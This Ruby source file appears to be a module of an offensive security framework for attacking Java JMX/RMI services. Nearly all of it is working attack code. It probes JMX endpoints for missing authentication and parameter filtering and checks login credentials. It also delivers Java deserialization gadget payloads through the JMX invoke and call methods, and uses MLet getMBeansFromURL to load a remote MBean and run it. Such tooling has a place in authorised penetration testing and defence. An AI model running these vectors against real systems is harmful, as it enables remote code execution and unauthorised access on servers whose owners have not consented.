# -*- coding: binary -*-

module Msf
  module Exploit::Java::Serialized::RMI

    class JMXInvokeDeserVector < RMICallDeserVector
      # this should take the RMIServer information,
      # actual connection is made here
      def	initialize(host, port, objId, uid: nil, ssl: false, creds: nil, ctx: nil, name: nil, method: nil)
        super(host, port, objId, uid: uid, ssl: ssl, ctx: ctx)
        @creds = creds
        @name = name
        @method = method
      end

      def id
        ['deser', @host, @port, @ctx.gadgets]
      end

      def prio
        50
      end

      def deliver(payl)
        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @ctx.reg, ssl: @ssl)
        # newClient
        jmxref = Rex::Java::JRMP.Util.unwrap_ref(
          client.call(@objId, -1, -1089742558549201240, [@creds], uid: @uid)
        )

        args = [
          Rex::Java::Serialization::Metamodel::JavaObject.new('Ljavax/management/ObjectName;', @name),
          @method,
          Rex::Java::JRMP::Util.make_marshalledobject(
            Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/Object;', [payl]), ctx.reg
          ),
          Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/String;', ['java.lang.String']),
          nil
        ]

        begin
          client.call(jmxref['objid'], -1, 1434350937885235744, args, uid: jmxref['uid'])
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return true
          else
            raise
          end
        end
      end

      def inspect
        format('JMX invoke to %s:%d method %s::%s: Deserialization %s', @host, @port, @name, @method, @ctx.gadgets.to_a.to_s)
      end
    end

    class JMXCallDeserVector < RMICallDeserVector
      # this should take the RMIServer information,
      # actual connection is made here
      def	initialize(host, port, objId, uid: nil, methodId: -1, methodHash: 0, ssl: false, baseargs: [nil], argidx: 0, creds: nil, ctx: nil)
        super(host, port, objId, uid: uid, methodHash: methodHash, ssl: ssl, baseargs: baseargs, argidx: argidx, ctx: ctx)
        @creds = creds
      end

      def id
        ['deser', @host, @port, @ctx.gadgets]
      end

      def prio
        20
      end

      def deliver(payl)
        args = @baseargs.dup
        args[@argidx] = payl

        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @ctx.reg, ssl: @ssl)
        # newClient
        jmxref = Rex::Java::JRMP::Util.unwrap_ref(
          client.call(@objId, -1, -1089742558549201240, [@creds], uid: @uid)
        )
        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @ctx.reg, ssl: @ssl)

        begin
          client.call(jmxref['objid'], -1, @methodHash, args, uid: jmxref['uid'])
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return true
          else
            raise
          end
        end
      end

      def inspect
        format('JMX call to %s:%d method %d: Deserialization %s', @host, @port, @methodHash, @ctx.gadgets.to_a.to_s)
      end
    end

    class JMXMLetVector < RMICallArgumentVector
      def	initialize(host, port, objId, uid: nil, ssl: false, creds: nil, name: nil, reg: nil)
        super(host, port, objId, uid: uid, ssl: ssl)
        @creds = creds
        @name = name
        @reg = reg
      end

      def id
        ['mlet', @host, @port]
      end

      def prio
        -50
      end

      def deliver(payl)
        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
        # newClient
        jmxref = Rex::Java::JRMP::Util.unwrap_ref(
          client.call(@objId, -1, -1089742558549201240, [@creds], uid: @uid)
        )
        args = ['javax.management.loading.MLet', @name, nil]

        # createMBean(Ljava/lang/String;Ljavax/management/ObjectName;Ljavax/security/auth/Subject;)Ljavax/management/ObjectInstance; 2510753813974665446
        begin
          client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          client.call(jmxref['objid'], -1, 2510753813974665446, args, uid: jmxref['uid'])
          Util.info 'Created MLet bean instance'
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          raise if root[0][0] != 'javax.management.InstanceAlreadyExistsException'
          Util.info 'MLet bean instance already exists'
        rescue ::Exception => e
          Util.error 'Failed to create MLet instance: ' + e.to_s
        end

        # invoke(Ljavax/management/ObjectName;Ljava/lang/String;Ljava/rmi/MarshalledObject;[Ljava/lang/String;Ljavax/security/auth/Subject;)Ljava/lang/Object; 1434350937885235744

        args = [@name, 
                'getMBeansFromURL',
                Rex::Java::JRMP::Util.make_marshalledobject(
                  Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/Object;',
                                                                     [payl]), @reg),
                Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/String;', 
                                                                   ['java.lang.String']), 
                nil]

        begin
          client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          r = client.call(jmxref['objid'], -1, 1434350937885235744, args, uid: jmxref['uid'])

          if !r[1].key?('elements') || 
              r[1]['elements'].empty? || 
              r[1]['elements'][0].empty? ||
              r[1]['elements'][0][1].empty? ||
              r[1]['elements'][0][1]['name'].nil?
            Util.error 'MBean creation seems to have failed, response ' + r.to_s
            return
          end

          on = r[1]['elements'][0][1]['name']
          args = [
            Rex::Java::Serialization::Metamodel::JavaObject.new('Ljavax/management/ObjectName;',
                                                                'name' => on[1]['name']),
            'run',
            Rex::Java::JRMP::Util.make_marshalledobject(
              Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/Object;', []), @reg
            ),
            Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/String;', []), 
            nil
          ]

          client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          r = client.call(
            jmxref['objid'], 
            -1, 
            1434350937885235744, 
            args, 
            uid: jmxref['uid'])

        rescue Rex::Java::JRMP::JRMPError => e
          raise
        rescue ::Exception => e
          Util.error 'Failed to create MBean via MLet: ' + e.to_s
          raise
        rescue Timeout::Error
          Util.error 'Timeout waiting for MBean creation'
        end
      end

      def inspect
        format('JMX MLet loading on %s:%d', @host, @port)
      end
    end

    class JMXProber < ReferenceProber
      attr_reader :auth

      @@builtins = [
        'java.lang:type=MemoryPool,name=Metaspace',
        'java.lang:name=Metaspace,type=MemoryPool',
        'java.lang:type=MemoryPool,name=PS Old Gen',
        'java.lang:type=MemoryPool,name=Compressed Class Space',
        'java.lang:name=Compressed Class Space,type=MemoryPool',
        'java.lang:type=MemoryPool,name=PS Eden Space',
        'java.lang:type=MemoryPool,name=Code Cache',
        'java.lang:type=MemoryPool,name=PS Survivor Space',
        'java.lang:name=Survivor Space,type=MemoryPool',
        'java.lang:name=Tenured Gen,type=MemoryPool',
        'java.lang:name=Eden Space,type=MemoryPool',
        'java.lang:name=CodeHeap \'profiled nmethods\',type=MemoryPool',
        'java.lang:name=CodeHeap \'non-nmethods\',type=MemoryPool',
        'java.lang:name=CodeHeap \'non-profiled nmethods\',type=MemoryPool',
        'java.lang:type=GarbageCollector,name=PS Scavenge',
        'java.lang:type=GarbageCollector,name=PS MarkSweep',
        'java.lang:name=MarkSweepCompact,type=GarbageCollector',
        'java.lang:name=Copy,type=GarbageCollector',
        'java.lang:type=MemoryManager,name=CodeCacheManager',
        'java.lang:name=CodeCacheManager,type=MemoryManager',
        'java.lang:type=MemoryManager,name=Metaspace Manager',
        'java.lang:name=Metaspace Manager,type=MemoryManager',
        'java.lang:type=Runtime',
        'java.lang:type=Threading',
        'java.lang:type=OperatingSystem',
        'java.lang:type=Compilation',
        'java.lang:type=Memory',
        'java.nio:type=BufferPool,name=direct',
        'java.nio:name=direct,type=BufferPool',
        'java.nio:type=BufferPool,name=mapped',
        'java.nio:name=mapped,type=BufferPool',
        'java.util.logging:type=Logging',
        'java.lang:type=ClassLoading',
        'com.sun.management:type=HotSpotDiagnostic',
        'com.sun.management:type=DiagnosticCommand',
        'jdk.management.jfr:type=FlightRecorder',
        'JMImplementation:type=MBeanServerDelegate',
      ]

      def initialize(name, ref, reg, connhost, jmxcreds: nil, rc: nil)
        super(name, ref, reg, connhost, rc)

        @skip = false
        @jmxconnref = nil
        @needauth = true
        @auth = false
        @jmxcreds = jmxcreds
        @rc = rc
        begin
          @jmxver = send(-1, -8081107751519807347, [])
          Util.info 'JMX Version: ' + @jmxver.strip
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if name == 'jmxrmi'
            raise
          else
            Util.info 'Does not appear a be a JMX service'
            @skip = true
          end
        end
      end

      def test_call(payl, reg, params)
        args = params['args']
        args[params['argidx']] = payl
        begin
          send(-1, params['methodhash'], args, customreg: reg)
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return
          else
            return type
          end
        end
      end

      def sendClient(methodhash, args, location: nil, customreg: nil)
        return if @jmxconnref.nil?

        reg = @reg
        unless customreg.nil?
          customreg.load('model/rmi.json')
          reg = customreg
        end

        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, reg, location: location, ssl: @ssl)
        client.call(@jmxconnref['objid'], -1, methodhash, args, uid: @jmxconnref['uid'])
      end

      def run
        vectors = []
        return if @skip

        vectors += run_auth
        return if @jmxconnref.nil?

        begin
          connid = sendClient(-67907180346059933, [])
          Util.info 'JMX connection valid, id: ' + connid
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          Util.error root.to_s
        end

        vectors += run_param_filter
        vectors += run_mlet if @rc.tryMlet?
        vectors += run_object_enum
        vectors
      end

      def close
        begin
          Util.info 'Trying to close JMX connection'
          sendClient(-4742752445160157748, [])
        rescue ::Exception
        end
        @jmxconnref = nil
      end

      def run_auth
        vectors = []
        filtered = false
        classload = false
        begin
          url = Rex::Java::Serialization::Metamodel::JavaObject.new('Ljava/net/URL;', 
                                                                    'protocol' => 'http',
                                                                    'host' => 'test.invalid',
                                                                    'hashCode' => -1)
          o = send(-1, -1089742558549201240, [url])
          Util.info 'JMX does not appear to require authentication'
          unless @rc.tryMlet?
            Util.vuln 'This usually means that MLet loading is allowed'
          end
          Util.vuln 'JMX auth (newClient) does not filter parameters'
          classload = @rc.tryClassload? && Util.test_remoteclassloading(@host, 
                                                                        @port, 
                                                                        @reg, 
                                                                        @objid, 
                                                                        @uid, 
                                                                        -1,
                                                                        -1089742558549201240, 
                                                                        ssl: @ssl)
          @jmxconnref = Rex::Java::JRMP::Util.unwrap_ref(o)
          @needauth = false
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException' ||
              (type == 'java.lang.ClassCastException' &&
               root[1]['detailMessage'].start_with?('Unsupported type:'))
          Util.okay 'JMX auth filters parameter types'
          filtered = true
          @needauth = false
          elsif type == 'java.lang.SecurityException'
            Util.vuln 'JMX auth required, but unfiltered parameters'
            classload = @rc.tryClassload? && Util.test_remoteclassloading(@host, 
                                                                          @port, 
                                                                          @reg, 
                                                                          @objid, 
                                                                          @uid, 
                                                                          -1, 
                                                                          -1089742558549201240, 
                                                                          ssl: @ssl)
            @auth = true
          elsif type == 'java.lang.ClassCastException'
            Util.vuln 'JMX auth (newClient) does not filter parameters'
            classload = @rc.tryClassload? && Util.test_remoteclassloading(@host, 
                                                                          @port, 
                                                                          @reg, 
                                                                          @objid, 
                                                                          @uid, 
                                                                          -1, 
                                                                          -1089742558549201240, 
                                                                          ssl: @ssl)
          else
            Util.error 'JMX connection failed: ' + type
          end
        end

        if classload
          vectors.push(RMIClassLoadingVector.new(@host, 
                                                 @port, 
                                                 @objid, 
                                                 uid: @uid,
                                                 methodHash: -1089742558549201240,
                                                 ssl: @ssl))
        end

        if @rc.tryDeser? && !filtered
          ctx = Rex::Java::Serialization::Probe::BuiltinProbes.new.create_context(@reg, 
                                                                           params: {
            'objid' => @objid,
            'methodhash' => -1089742558549201240,
            'argidx' => 0,
            'args' => [nil]
          })

          strategy = Rex::Java::Serialization::Probe::ExceptionProbeStrategy.new(method(:test_call))
          strategy.init(ctx)

          if ctx.run(strategy)
            vectors.push(RMICallDeserVector.new(@host, 
                                                @port, 
                                                @objid,
                                                uid: @uid,
                                                methodHash: -1089742558549201240, 
                                                ssl: @ssl,
                                                ctx: ctx))
          end
        end

        if @jmxconnref.nil? && @needauth && @jmxcreds.nil?
          Util.error 'Further checks would require credentials'
        elsif @jmxconnref.nil?
          if !@jmxcreds.nil?
            Util.info 'Trying authenticated JMX connection'
            @auth = true
          else
            Util.info 'Trying unauthenticated JMX connection'
          end
          begin
            o = send(-1, -1089742558549201240, [@jmxcreds])
            @jmxconnref = Rex::Java::JRMP::Util.unwrap_ref(o)
            Util.info 'Connection established successfully'
            if !@auth && !@rc.tryMlet?
              Util.vuln 'This usually means that MLet loading is allowed'
            end
          rescue Rex::Java::JRMP::JRMPError => e
            root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
            type = root[0][0]
            if type == 'java.lang.SecurityException'
              Util.error 'Invalid Credentials: ' + root[1]['detailMessage']
              @auth = true
            else
              raise
            end
          end
        end
        vectors
      end

      def trylogin(user, pass)
        creds = Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/String;', [user, pass])
        send(-1, -1089742558549201240, [creds])
        return true
      rescue Rex::Java::JRMP::JRMPError => e
        root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
        type = root[0][0]
        if type == 'java.lang.SecurityException'
          return false
        else
          raise
        end
      end

      def send_param(payl, reg, params)
        args = params['args']
        args[params['argidx']] = payl
        sendClient(params['methodhash'], args, customreg: reg)
      rescue Rex::Java::JRMP::JRMPError => e
        root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
        type = root[0][0]
        if type == 'java.lang.IllegalArgumentException'
          return
        else
          return type
        end
      end

      def run_param_filter
        vectors = []
        filtered = false
        begin
          url = Rex::Java::Serialization::Metamodel::JavaObject.new('Ljava/net/URL;', 
                                                                    'protocol' => 'http',
                                                                    'host' => 'test.invalid',
                                                                    'hashCode' => -1)
          sendClient(-2042362057335820635, [url])
          raise 'Should not succeed'
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException'
            Util.okay 'JMX getMBeanCount has filtering (please provide detail to author)'
            filtered = true
          elsif type == 'java.lang.ClassCastException' ||
            (type == 'java.lang.IllegalArgumentException' &&
             (root[1]['detailMessage'] == 'argument type mismatch' ||
              root[1]['detailMessage'].start_with?('java.lang.ClassCastException')))
          Util.vuln 'JMX getMBeanCount does not filter parameters'
          else
            raise
          end
        end

        if @rc.tryClassload? && 
            Util.test_remoteclassloading(@host,
                                         @port, 
                                         @reg, 
                                         @jmxconnref['objid'], 
                                         @jmxconnref['uid'], 
                                         -1, 
                                         -2042362057335820635, 
                                         ssl: @ssl)
          vectors.push(RMIClassLoadingVector.new(@host, 
                                                 @port, 
                                                 @jmxconnref['objid'],
                                                 uid: @jmxconnref['uid'],
                                                 methodHash: -2042362057335820635,
                                                 ssl: @ssl))
        end

        return vectors if filtered || !@rc.tryDeser?

        ctx = Rex::Java::Serialization::Probe::BuiltinProbes.new.create_context(@reg, 
                                                             params: {
          'methodhash' => -2042362057335820635,
          'args' => [nil],
          'argidx' => 0
        })
        strategy = Rex::Java::Serialization::Probe::ExceptionProbeStrategy.new(method(:send_param))
        strategy.init(ctx)

        if ctx.run(strategy)
          vectors.push(JMXCallDeserVector.new(@host, 
                                              @port, 
                                              @objid, 
                                              ssl: @ssl,
                                              creds: @jmxcreds,
                                              ctx: ctx,
                                              uid: @uid,
                                              methodHash: -2042362057335820635))
        end
        vectors
      end

      def send_invoke(payl, reg, params)
        sendClient(1434350937885235744, [
          Rex::Java::Serialization::Metamodel::JavaObject.new('Ljavax/management/ObjectName;', 
                                                              params['name']),
          'test',
          Rex::Java::JRMP::Util.make_marshalledobject(
            Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/Object;', [payl]), 
            reg
          ),
          Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/String;', 
                                                             ['java.lang.String']),
          nil
        ])
      rescue Rex::Java::JRMP::JRMPError => e
        root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
        type = root[0][0]
        if type == 'java.lang.IllegalArgumentException'
          return
        else
          return type
        end
      end

      def run_object_enum
        vectors = []
        objects = []
        begin
          args = [
            Rex::Java::Serialization::Metamodel::JavaObject.new('Ljavax/management/ObjectName;',{}), 
            nil, 
            nil
          ]
          o = sendClient(9152567528369059802, args)
          objects = o[1]['elements']
          Util.info 'Found ' + objects.length.to_s + ' JMX objects, checking for available gadgets...'
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Data.unwrap_exception(e.ex)
          type = root[0][0]
          Util.error 'JMX enumeration failed: ' + type + ' - ' + root[1]['detailMessage']
        end

        # invoke(Ljavax/management/ObjectName;Ljava/lang/String;Ljava/rmi/MarshalledObject;[Ljava/lang/String;Ljavax/security/auth/Subject;)Ljava/lang/Object; 1434350937885235744

        objects.each do |obj|
          on = obj[1]['name']
          # builtin objects should have the system or app classloader that can be
          # reached with other vectors
          next if @@builtins.include?(on)
          Util.info "Checking object " + on
          begin
            sendClient(1434350937885235744, [
              Rex::Java::Serialization::Metamodel::JavaObject.new('Ljavax/management/ObjectName;', 
                                                                  obj[1]),
              'test',
              Rex::Java::JRMP::Util.make_marshalledobject(
                Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/Object;', []), 
                @reg
              ),
              Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/String;', 
                                                                 ['java.lang.String']),
              nil
            ])
          rescue Rex::Java::JRMP::JRMPError => e
            root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
            type = root[0][0]

            if type != 'javax.management.ReflectionException' && type != 'java.lang.SecurityException'
              if !root[1]['detailMessage'].nil?
                Util.error 'JMX invoke on ' + obj[1]['name'] + ' unexpected error: ' + type + ' - ' + root[1]['detailMessage']
              else
                Util.error 'JMX invoke on ' + obj[1]['name'] + ' unexpected error: ' + type + ' - '
              end
              next
            end
          end

          next unless @rc.tryDeser?

          ctx = Rex::Java::Serialization::Probe::BuiltinProbes.new.create_context(@reg, params: {
            'name' => obj[1]
          })
          strategy = Rex::Java::Serialization::Probe::ExceptionProbeStrategy.new(method(:send_invoke))
          strategy.init(ctx)

          next unless ctx.run(strategy)
          vectors.push(JMXInvokeDeserVector.new(@host, 
                                                @port, 
                                                @objid, 
                                                ssl: @ssl,
                                                creds: @jmxcreds,
                                                ctx: ctx,
                                                uid: @uid,
                                                name: obj[1],
                                                method: 'test'))
        end
        vectors
      end

      def run_mlet
        vectors = []
        begin
          Util.info 'Trying to create MLet instance'
          mletname = Rex::Java::Serialization::Metamodel::JavaObject.new(
            'Ljavax/management/ObjectName;', 'name' => 'exploit:name=Mlet')
          args = ['javax.management.loading.MLet', mletname, nil]

          # createMBean(Ljava/lang/String;Ljavax/management/ObjectName;Ljavax/security/auth/Subject;)Ljavax/management/ObjectInstance; 2510753813974665446
          begin
            o = sendClient(2510753813974665446, args)
            Util.info 'Created MLet bean instance'
          rescue Rex::Java::JRMP::JRMPError => e
            root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
            if root[0][0] != 'javax.management.InstanceAlreadyExistsException'
              raise
            end
            Util.info 'MLet bean instance already exists'
          end

          # invoke(Ljavax/management/ObjectName;Ljava/lang/String;Ljava/rmi/MarshalledObject;[Ljava/lang/String;Ljavax/security/auth/Subject;)Ljava/lang/Object; 1434350937885235744

          args = [
            mletname, 
            'getMBeansFromURL',
            Rex::Java::JRMP::Util.make_marshalledobject(
              Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/Object;',
                                             ['http://test.invalid/test.mlet']), 
              @reg
            ),
            Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/lang/String;', 
                                                               ['java.lang.String']), 
            nil
          ]
          sendClient(1434350937885235744, args)
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]

          if type == 'java.lang.SecurityException'
            Util.okay 'MLet loading denied'
          elsif type == 'javax.management.MBeanException'
            Util.vuln 'MLet loading enabled: ' + root[1]['detailMessage']

            vectors.push(JMXMLetVector.new(@host, 
                                           @port, 
                                           @objid, 
                                           ssl: @ssl,
                                           creds: @jmxcreds,
                                           uid: @uid,
                                           name: mletname,
                                           reg: @reg))
          else
            Util.error 'MLet initalization failed: ' + type + ' - ' + root[1]['detailMessage']
          end
        end
        vectors
      end
    end
  end
end
